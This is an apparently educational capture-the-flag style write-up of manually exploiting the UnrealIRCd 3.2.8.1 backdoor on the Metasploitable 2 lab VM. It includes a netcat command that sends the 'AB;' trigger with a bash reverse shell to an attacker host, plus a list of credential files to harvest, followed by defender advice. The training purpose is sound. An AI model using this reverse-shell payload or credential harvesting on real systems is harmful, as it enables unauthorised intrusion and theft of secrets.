---
title: "Metasploitable 2 - Manual RCE"
date: 2026-02-20
platform: VulnHub
difficulty: Easy
category: offensive
summary: "UnrealIRCd RCE without Metasploit, sudo misconfiguration, and credential harvesting from accessible service config files."
---

## Overview

Metasploitable 2 is the classic learning VM, intentionally stuffed with vulnerable services. This run focused on doing one of those services (**UnrealIRCd 3.2.8.1 with the backdoor**) **without Metasploit** to understand what the framework was actually doing.

The room is the *"learn by doing the manual chain after you've done the easy chain"* approach to penetration testing. Metasploit is fine for production, but understanding the manual chain is the only way to learn what the framework abstracts.

## Tools Used

- **nmap** for service enumeration with NSE script detection.
- **netcat** for the manual exploit and the listener.
- **A text editor** for crafting the IRC commands.
- **sudo** for the privesc.

## Methodology

**Step 1 - Service enumeration.** Metasploitable 2 has nearly twenty open ports. Today's target: **UnrealIRCd 3.2.8.1** on port 6667.

```bash
nmap -p- -sV --script vuln <TARGET_IP>
```

The `--script vuln` flag runs nmap's vulnerability detection scripts, which often surface the specific CVE for a fingerprinted version.

**Step 2 - Understand the UnrealIRCd backdoor.** UnrealIRCd 3.2.8.1 was distributed (briefly, in 2009-2010) with a **deliberate backdoor** introduced via a compromised release server. Any client that sends the magic string `AB;` followed by a shell command will have the command executed by the IRC daemon, which runs as root by default.

This is a **CVE-2010-2075** finding. It's one of the cleanest examples of a *supply chain attack* in the wild.

**Step 3 - Manual exploitation with netcat.** The Metasploit module wraps this in two seconds. The manual chain is also two seconds, but reveals what's happening.

```bash
# attacker listener:
nc -lvnp 4444

# attacker, in a separate terminal:
nc <TARGET_IP> 6667
# at the prompt, send:
AB; bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
```

The IRC daemon parses the input, hits the backdoored code path, executes the bash payload, and a reverse shell calls back.

**Step 4 - Identify the user.** The shell lands as the IRC daemon's user, which on this box is *root*. UnrealIRCd was misconfigured (or intentionally configured for the lab) to run as root, which is the second part of why this is RCE-to-root in one move.

**Step 5 - Credential harvesting.** Even with root already achieved, walking the filesystem for credentials is a good habit. Common interesting locations on a Linux box:

- `/etc/shadow` for password hashes.
- `/var/www/` for web app config files with database credentials (Metasploitable has several).
- `/home/*/` for user-specific config and SSH keys.
- `/etc/exports` and `/etc/samba/smb.conf` for share configurations.

## Key Takeaways

- **Supply chain attacks are real and historical.** The UnrealIRCd backdoor is the textbook example.
- **Manual exploitation teaches you what Metasploit hides.** Always do at least one manual run of any new technique.
- **Service-account configuration matters.** UnrealIRCd shouldn't be running as root, ever. That misconfiguration converted *any* RCE to root, including the backdoor.
- **Credential harvesting is a habit, not a step.** Walk the filesystem on every foothold.

## What a Defender Should Do

- Verify package integrity for downloaded software with PGP signatures or checksums published over a separate channel. The UnrealIRCd compromise was detected by checksum mismatch.
- Run services as low-privileged service accounts, never as root. systemd makes this almost effortless with the `User=` directive in unit files.
- Keep an inventory of which services are running and on which ports. Anything you don't recognize is a finding.
- Patch and re-fingerprint after every release. UnrealIRCd's vendor fixed the backdoor immediately; sites that ran the bad version for years were patched-vulnerable.
- Monitor for unexpected shell spawns from non-shell services. *bash* spawned by *unrealircd* should never happen in normal operation.
